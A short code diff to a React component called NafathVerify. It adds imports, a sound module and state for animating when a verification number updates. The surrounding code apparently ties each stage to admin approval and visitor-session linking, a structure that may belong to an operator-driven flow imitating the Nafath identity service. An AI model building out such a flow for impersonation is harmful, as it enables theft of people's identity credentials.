@@ -1,7 +1,7 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
-import { motion } from "framer-motion";
-import { RefreshCw, Loader2 } from "lucide-react";
+import { motion, AnimatePresence } from "framer-motion";
+import { RefreshCw, Loader2, CheckCircle2 } from "lucide-react";
 import VerificationLayout from "@/components/VerificationLayout";
 import { supabase } from "@/integrations/supabase/client";
 import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
@@ -10,6 +10,7 @@ import { linkVisitorToSession } from "@/lib/visitorLink";
 import biometricIllustration from "@/assets/biometric-verify-illustration.png";
 import { useLanguage } from "@/i18n/LanguageContext";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
+import { sounds } from "@/lib/sounds";
 
 const NafathVerify = () => {
   const navigate = useNavigate();
@@ -28,6 +29,8 @@ const NafathVerify = () => {
   const [timer, setTimer] = useState(120);
   const [canResend, setCanResend] = useState(false);
   const [verifyNumber, setVerifyNumber] = useState<string | null>(null);
+  const [numberJustUpdated, setNumberJustUpdated] = useState(false);
+  const prevNumberRef = useRef<string | null>(null);
 
   const approvalStatus = useAdminApproval(orderId, "nafath_verify");
 
